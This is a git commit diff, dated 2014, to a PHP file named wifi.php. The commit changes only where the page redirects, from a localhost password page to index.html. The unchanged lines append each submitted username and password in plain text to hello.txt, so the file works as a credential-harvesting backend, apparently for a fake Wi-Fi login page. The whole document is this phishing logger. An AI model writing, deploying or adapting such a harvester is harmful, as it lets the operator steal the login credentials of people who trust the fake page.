582ed4c77707f6c1f958802ad5e7ba0581caa8e7
Avasz <avashmulmi@gmail.com>
2014-07-19 17:32:28 +0545

    new

--- wifi.php
+++ wifi.php
@@ -1,5 +1,5 @@
     <?php
-    header('Location: http://localhost/password.html');
+    header('Location: index.html');
     $handle = fopen("hello.txt", "a");
     fwrite($handle, "Username:$_POST[username]\tpassword:$_POST[password]\n");
     fclose($handle);
